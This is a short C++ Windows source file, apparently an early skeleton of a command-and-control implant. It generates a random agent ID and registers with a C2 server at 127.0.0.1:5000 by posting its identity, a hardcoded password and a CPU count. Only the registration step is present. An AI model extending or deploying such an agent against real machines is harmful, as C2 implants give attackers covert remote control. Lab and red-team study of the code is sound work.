#include <windows.h>
#include <string>
#include <iostream>
#include <stdlib.h>
#include "http.h"

LPCWSTR c2Domain = L"127.0.0.1";
LPCWSTR registerURI = L"/register_agent";
std::string password = "password";
std::string whoami = "agent"; 
int port = 5000;
std::string agentId;
int cpus = 1;

// generate a random agent id of size digits
std::string generateRandomId(int size) {
    std::string id = "";
    for (int i = 0; i < size; i++) {
        id += std::to_string(rand() % 10);
    }
    return id;
}

// register the agent on the c2 server
BOOL registerAgent() {
    std::string payload = "{\"whoami\":\"" + whoami + "\",\"agent_id\":" + agentId + 
                          ",\"password\":\"" + password + "\",\"cpus\":" + std::to_string(cpus) + "}";
    // std::cout << payload << std::endl;
    std::string response = httpPost(c2Domain, port, registerURI, payload);
    std::cout << response << std::endl;
    return TRUE;
}

int main(int argc, char* argv[]){
    agentId = generateRandomId(10);
    registerAgent();
    return 0;
}